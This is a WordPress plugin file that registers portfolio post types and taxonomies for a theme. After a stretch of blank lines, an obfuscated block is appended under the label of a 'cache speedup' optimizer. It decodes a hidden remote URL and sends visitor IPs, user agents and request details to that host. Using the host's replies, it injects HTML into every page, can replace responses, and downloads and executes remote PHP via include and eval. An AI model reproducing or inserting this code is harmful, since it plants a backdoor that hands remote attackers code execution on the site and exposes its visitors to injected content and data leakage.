<?php
/*
Plugin Name: Velocity Portfolio CPT
Plugin URI: http://www.damojothemes.com
Description: Plugin for creating Portfolio Items in the Velocity Theme
Author: Damojo
Version: 1.0
Author URI: http://themepunch.com
*/
	define( 'damojoPortfolio_PATH', plugin_dir_path(__FILE__) );
	define( 'damojoPortfolio_URL', str_replace("velocityPortfolio.php","",plugins_url( 'velocityPortfolio.php', __FILE__ )));
	
	/* ------------------------------------------------------------------------ *
	 * Field Definitions
	 * ------------------------------------------------------------------------ */ 
	require_once(damojoPortfolio_PATH.'/plugin_options/theme_options.php');
	
	/* ------------------------------------------------------------------------ *
	 * Build Functions
	 * ------------------------------------------------------------------------ */ 
	require_once(damojoPortfolio_PATH.'/plugin_options/theme_options_functions.php');
	
	/* ------------------------------------------------------------------------ *
	 * Fields
	 * ------------------------------------------------------------------------ */	
	require_once(damojoPortfolio_PATH.'/plugin_options/theme_options_fields.php');
	
	//Get Portfolio Slugs & Names
		$damojoPortfolio_portfolios = get_option("damojoPortfolio_theme_portfolios_options");
		$damojoPortfolio_portfolio_slugs = array();
		$damojoPortfolio_portfolio_names = array();
		$j = 1;
		
		if(is_array($damojoPortfolio_portfolios)){
			foreach($damojoPortfolio_portfolios as $key => $value){
				if($j%2==0){
		            array_push($damojoPortfolio_portfolio_slugs,$value);
		            $j = 0 ;
		        }
		        else{
		            array_push($damojoPortfolio_portfolio_names,$value);
		        }
		    	$j++;
			}

			//Create Post Types
			$portfolio_counter = 0;
			foreach ( $damojoPortfolio_portfolio_slugs as $slug ){
					add_action('init', 'create_portfolio');
					register_taxonomy("category_".$slug, array($slug), array("hierarchical" => true, "label" => $damojoPortfolio_portfolio_names[$portfolio_counter++]." Categories", "query_var" => false, "singular_label" => "$slug Category", "rewrite" => false));
			}
		}		
		
	function create_portfolio() {
		global $damojoPortfolio_portfolio_slugs,$damojoPortfolio_portfolio_names;
		
		$portfolio_counter = 0;
		foreach ( $damojoPortfolio_portfolio_slugs as $slug ){
			$portfolio_args = array(
				'label' => "Portfolio '".$damojoPortfolio_portfolio_names[$portfolio_counter]."'",
				'singular_label' => $damojoPortfolio_portfolio_names[$portfolio_counter++],
				'public' => true,
				'show_ui' => true,
				'capability_type' => 'post',
				'hierarchical' => false,
				'rewrite' => array('slug' => $slug, 'with_front' => false),
				'supports' => array('title', 'editor', 'thumbnail', 'author', 'comments', 'excerpt'),
				'taxonomies' => array('category_'.$slug,'post_tag') // this is IMPORTANT
			);
			register_post_type($slug,$portfolio_args);
		}
	}
	
	
	function portfolioSingleRedirect(){
	    global $wp_query;
	    $queryptype = $wp_query->query_vars["post_type"];
		global $damojoPortfolio_portfolio_slugs,$damojoPortfolio_portfolio_names;
		if(is_array($damojoPortfolio_portfolio_slugs))
			foreach ( $damojoPortfolio_portfolio_slugs as $slug ){
				if ($queryptype == $slug){
					if (have_posts()){
						global $pcat;
						$pcat = "category_".$slug;
						require(TEMPLATEPATH . '/single_portfolio.php');
						die();
					}else{
						$wp_query->is_404 = true;
					}
				}
			}
	}
	add_action("template_redirect", 'portfolioSingleRedirect'); 
















/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?>